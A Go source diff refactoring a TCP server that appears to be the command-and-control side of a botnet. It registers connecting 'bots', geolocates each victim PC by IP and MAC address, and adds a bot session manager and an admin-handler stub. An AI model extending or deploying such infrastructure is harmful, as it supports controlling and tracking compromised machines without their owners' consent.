@@ -4,7 +4,6 @@ import (
 	"encoding/hex"
 	"errors"
 	"fmt"
-	"icu/common/config"
 	"icu/common/constants"
 	"icu/common/types"
 	"icu/common/utils"
@@ -12,22 +11,30 @@ import (
 	"io"
 	"net"
 	"os"
+	"strconv"
 	"time"
 )
 
 type TCPServer struct {
-	host   string
-	port   int
-	cache  *lib.Cache
-	logger *lib.Logger
+	host    string
+	port    int
+	cache   *lib.Cache
+	logger  *lib.Logger
+	session *lib.SessionManager
 }
 
 func NewTCPServer(cache *lib.Cache) *TCPServer {
+	portInt, err := strconv.Atoi(os.Getenv("SERVER_PORT"))
+	if err != nil {
+		return &TCPServer{}
+	}
+
 	return &TCPServer{
-		host:   config.ServerRemoteAddr,
-		port:   config.ServerRemotePort,
-		cache:  cache,
-		logger: lib.NewLogger(),
+		host:    os.Getenv("SERVER_ADDR"),
+		port:    portInt,
+		cache:   cache,
+		logger:  lib.NewLogger(),
+		session: lib.NewSessionManager(),
 	}
 }
 
@@ -96,6 +103,8 @@ func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
 		}
 
 		this.cache.SetCache(utils.MacPrettyConvert(botClient.mac), "ipgeo", ipgeoStruct, 10*time.Minute)
+		this.session.NewBotSession(utils.MacPrettyConvert(botClient.mac), botClient)
+
 		cache := this.cache.GetCache(utils.MacPrettyConvert(botClient.mac), "ipgeo").(types.IPGeo)
 		this.logger.Info(fmt.Sprintf("CONNECTED PC[%s %s, %s (%f, %f)]", cache.IP, cache.CountryName, cache.City, cache.Latitude, cache.Longitude))
 	})
@@ -131,3 +140,5 @@ func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
 		botClient.parseData(buffer[:data])
 	}
 }
+
+func (this *TCPServer) handleAdmin(conn net.Conn, data []byte) {}
